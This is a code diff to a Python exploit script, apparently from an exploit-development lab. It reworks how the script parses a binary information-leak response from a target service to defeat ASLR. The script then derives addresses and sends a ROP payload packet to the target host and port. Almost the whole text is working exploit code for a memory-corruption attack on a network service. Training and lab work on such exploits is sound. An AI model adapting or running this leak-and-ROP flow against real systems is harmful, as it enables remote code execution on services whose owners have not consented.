@@ -3,20 +3,48 @@
 from __future__ import annotations
 
 import argparse
-import re
-from struct import pack
+from struct import pack, unpack
 
-from exploit_scaffold import OP_LEAK, OP_ROP, build_packet, send_packet
+from exploit_scaffold import (
+    CONTROL_V2_RECORD,
+    OSED_MAGIC,
+    OP_LEAK,
+    OP_ROP,
+    RECORD_QUERY,
+    build_request,
+    send_packet,
+)
 
-LEAK_PATTERN = re.compile(rb"LEAK:(?:0x)?([0-9A-Fa-f]+)")
+LEAK_RESPONSE_LENGTH = 20
+
+
+def parse_leak_response(response: bytes) -> int:
+    if len(response) != LEAK_RESPONSE_LENGTH:
+        raise RuntimeError(f"unexpected leak response length: {len(response)}")
+
+    magic, opcode, control, body_length = unpack("<IHHI", response[:12])
+    if (magic, opcode, control, body_length) != (
+        OSED_MAGIC,
+        OP_LEAK,
+        CONTROL_V2_RECORD,
+        8,
+    ):
+        raise RuntimeError("unexpected leak response header")
+
+    status, kind, value = unpack("<HHI", response[12:])
+    if status != 0 or kind != RECORD_QUERY:
+        raise RuntimeError("leak response reported an unexpected result")
+    return value
 
 
 def request_leak(host: str, port: int) -> int:
-    response = send_packet(host, port, build_packet(OP_LEAK, b"ASLR"))
-    match = LEAK_PATTERN.search(response)
-    if match is None:
-        raise RuntimeError(f"unexpected leak response: {response!r}")
-    return int(match.group(1), 16)
+    response = send_packet(
+        host,
+        port,
+        build_request(OP_LEAK, b""),
+        response_length=LEAK_RESPONSE_LENGTH,
+    )
+    return parse_leak_response(response)
 
 
 def derive_addresses(leak: int, anchor_rva: int, target_rva: int) -> tuple[int, int]:
@@ -78,7 +106,7 @@ def main() -> None:
     response = send_packet(
         args.host,
         args.port,
-        build_packet(OP_ROP, payload),
+        build_request(OP_ROP, payload),
         expect_response=False,
     )
     if response:
